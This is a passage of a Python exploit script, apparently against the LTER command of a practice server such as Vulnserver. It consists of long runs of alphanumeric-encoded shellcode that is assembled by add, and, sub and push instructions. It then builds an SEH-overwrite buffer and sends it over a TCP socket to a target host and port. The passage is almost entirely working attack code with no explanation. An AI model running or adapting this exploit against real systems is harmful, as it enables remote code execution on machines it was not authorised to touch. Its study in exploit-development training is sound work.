shellcode += "\x05\x66\x25\x72\x36" ## add  eax, 0x36722566
shellcode += "\x05\x65\x14\x72\x35" ## add  eax, 0x35721465
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x24\x74\x45" ## add  eax, 0x45742465
shellcode += "\x05\x64\x24\x63\x44" ## add  eax, 0x44632464
shellcode += "\x05\x44\x24\x53\x44" ## add  eax, 0x44532444
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x47\x61\x46\x61" ## add  eax, 0x61466147
shellcode += "\x05\x46\x52\x35\x51" ## add  eax, 0x51355246
shellcode += "\x05\x35\x61\x34\x41" ## add  eax, 0x41346135
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x60\x21\x24\x52" ## add  eax, 0x52242160
shellcode += "\x05\x60\x11\x24\x51" ## add  eax, 0x51241160
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x67\x14\x65" ## add  eax, 0x65146746
shellcode += "\x05\x46\x56\x24\x54" ## add  eax, 0x54245646
shellcode += "\x05\x44\x35\x13\x64" ## add  eax, 0x64133544
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x27\x55\x75\x55" ## add  eax, 0x55755527
shellcode += "\x05\x26\x55\x64\x55" ## add  eax, 0x55645526
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x16\x43\x74\x42" ## add  eax, 0x42744316
shellcode += "\x05\x15\x33\x64\x42" ## add  eax, 0x42643315
shellcode += "\x05\x16\x32\x54\x42" ## add  eax, 0x42543216
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x12\x13\x33\x17" ## add  eax, 0x17331312
shellcode += "\x05\x21\x13\x33\x16" ## add  eax, 0x16331321
shellcode += "\x05\x12\x12\x23\x15" ## add  eax, 0x15231212
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x53\x71\x33\x47" ## add  eax, 0x47337153
shellcode += "\x05\x44\x61\x24\x47" ## add  eax, 0x47246144
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x75\x31\x23" ## add  eax, 0x23317561
shellcode += "\x05\x62\x64\x31\x13" ## add  eax, 0x13316462
shellcode += "\x05\x41\x54\x21\x22" ## add  eax, 0x22215441
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x15\x53\x50\x57" ## add  eax, 0x57505315
shellcode += "\x05\x05\x43\x50\x56" ## add  eax, 0x56504305
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x55\x66\x66\x11" ## add  eax, 0x11666655
shellcode += "\x05\x44\x65\x55\x12" ## add  eax, 0x12556544
shellcode += "\x05\x44\x44\x64\x11" ## add  eax, 0x11644444
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x35\x53\x33\x17" ## add  eax, 0x17335335
shellcode += "\x05\x35\x53\x34\x17" ## add  eax, 0x17345335
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x13\x26\x42\x17" ## add  eax, 0x17422613
shellcode += "\x05\x13\x15\x41\x26" ## add  eax, 0x26411513
shellcode += "\x05\x12\x26\x32\x15" ## add  eax, 0x15322612
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x67\x35\x77" ## add  eax, 0x77356723
shellcode += "\x05\x24\x66\x45\x67" ## add  eax, 0x67456624
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x07\x02\x30\x13" ## add  eax, 0x13300207
shellcode += "\x05\x07\x01\x40\x13" ## add  eax, 0x13400107
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x02\x21\x36" ## add  eax, 0x36210262
shellcode += "\x05\x61\x02\x10\x35" ## add  eax, 0x35100261
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x24\x61\x31\x42" ## add  eax, 0x42316124
shellcode += "\x05\x14\x50\x21\x41" ## add  eax, 0x41215014
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x16\x14\x53" ## add  eax, 0x53141667
shellcode += "\x05\x56\x05\x14\x52" ## add  eax, 0x52140556
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x47\x16\x15\x65" ## add  eax, 0x65151647
shellcode += "\x05\x46\x06\x14\x64" ## add  eax, 0x64140646
shellcode += "\x50"                 ## push eax


buffer=lastadjust
buffer+=shellcode
buffer+="A"*(3433-len(buffer))
buffer+=longjump
buffer+=alpha2
buffer+="A"*(3515-len(buffer))
buffer+=nseh
buffer+=seh
buffer+=espadjust
buffer+=alpha1
buffer+="D"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()

